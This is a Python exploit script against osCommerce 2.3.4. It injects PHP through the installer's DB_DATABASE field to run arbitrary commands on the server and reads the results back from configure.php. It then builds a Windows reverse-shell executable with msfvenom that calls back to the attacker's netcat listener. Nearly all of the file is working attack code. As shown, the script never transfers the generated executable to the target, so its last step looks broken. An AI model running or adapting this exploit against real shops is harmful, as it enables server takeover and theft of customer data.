#!/usr/bin/python3

import requests
import sys
import subprocess
import urllib3
import time
from colorama import Fore,Style
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Printing messages with context:
def print_message(message, type):
    if type == 'SUCCESS':
        print('[' + Style.BRIGHT + Fore.GREEN + '+' + Fore.WHITE + Style.NORMAL + '] ' + message)    # Success
    elif type == 'INFO':
        print('[' + Style.BRIGHT + Fore.BLUE + '*' + Fore.WHITE + Style.NORMAL + '] ' + message)     # Info
    elif type == 'ALERT':
        print('[' + Style.BRIGHT + Fore.YELLOW + '!' + Fore.WHITE + Style.NORMAL + '] ' + message)  # Alert
    elif type == 'ERROR':
        print('[' + Style.BRIGHT + Fore.RED + '-' + Fore.WHITE + Style.NORMAL + '] ' + message)      # Error

# Generating a reverse shell executable using msfvenom
def run_msfvenom(LHOST, LPORT):
    msfvenom_command = [
        "msfvenom",
        "-p", "windows/shell_reverse_tcp",
        f"LHOST={LHOST}",
        f"LPORT={LPORT}",
        "-f", "exe",
        "-o", "revshell.exe"
    ]
    try:
        print_message('Generating a reverse shell executable named "revshell.exe" using msfvenom ...', 'INFO')
        print_message(f'Executing: msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o revshell.exe', 'INFO')
        process = subprocess.Popen(msfvenom_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process.wait()
        print('')
    except subprocess.CalledProcessError as e:
        if e.returncode == 127:
            print_message("msfvenom is not installed. Install the Metasploit Framework and try again.", 'ALERT')
        else:
            print_message('Something went wrong :(', 'ERROR')

# Exploiting the File upload vulnerability in osCommerce 2.3.4
def exploit(RHOST, RPORT, path, command, timeout):
    target = f'http://{RHOST}:{RPORT}/{path}'
    targetURI = '/catalog/install/install.php?step=4'
    
    payload = "');"
    payload += "passthru('" + command + "');"
    payload += "/*"

    POST_data = {
		'DIR_FS_DOCUMENT_ROOT': './',
		'DB_DATABASE' : payload
	}

    print_message(f'Executing the command "{command}"  ...', 'INFO')
    response = requests.post(target + targetURI, data=POST_data, timeout=timeout)
    if(response.status_code == 200):
        print_message(f'The command "{command}" was executed successfully !!', 'SUCCESS')
        OutputURI = '/catalog/install/includes/configure.php' 
        Output = requests.get(target + OutputURI, timeout=timeout)
        if(Output.status_code == 200):
            execution = Output.text.split('\n')
            print('[' + Style.BRIGHT + Fore.GREEN + '+' + Fore.WHITE + Style.NORMAL + '] Execution results: ', end='')
            for i in range(2, len(execution)):
                print(Style.BRIGHT + execution[i] + Style.NORMAL)
        else:
            return '[' + Style.BRIGHT + Fore.RED + '+' + Fore.WHITE + Style.NORMAL + '-] The "config.php" file was not found !!'
    else:
        return '[' + Style.BRIGHT + Fore.RED + '+' + Fore.WHITE + Style.NORMAL + '-] The command was not executed successfully !! The target may not be vulnerable  !!'


if __name__ == '__main__':
    if len(sys.argv) != 6:
        print(Style.BRIGHT + "Usage   : " + Style.NORMAL + "python3 osCommerce-rce.py target_IP target_port target_uri local_ip netcat_port")
        print(Style.BRIGHT + "Example : " + Style.NORMAL + "python3 osCommerce-rce.py 10.10.134.254 80 /oscommerce-2.3.4/ 10.8.17.244 9999")
        sys.exit(1)
    
    RHOST = sys.argv[1]
    RPORT = sys.argv[2]
    TARGETURI = sys.argv[3]
    LHOST = sys.argv[4]
    LPORT = sys.argv[5]
    
    print('')

    try:
        print_message('Testing if the target is vulnerable ...', 'INFO')

        # Running the "whoami" command to test if the target is vulnerable
        exploit(RHOST, RPORT, TARGETURI, "whoami", timeout=10)
        print_message(f'Start a netcat listener by running the command: nc -nlvp {LPORT}', 'INFO')
        time.sleep(2)

        # Running msfvenom
        run_msfvenom(LHOST, LPORT)
        exploit(RHOST, RPORT, TARGETURI, "revshell.exe", timeout=7)
    except requests.exceptions.Timeout:
        # If the request timed out, it means that the reverse shell was successfull
        print_message('Check your netcat listener !!', 'INFO')
    except KeyboardInterrupt:
        print_message('Quitting ...', 'INFO')
        sys.exit(0)
    except Exception as e:
        print_message(f'Error: {e}', 'ERROR')
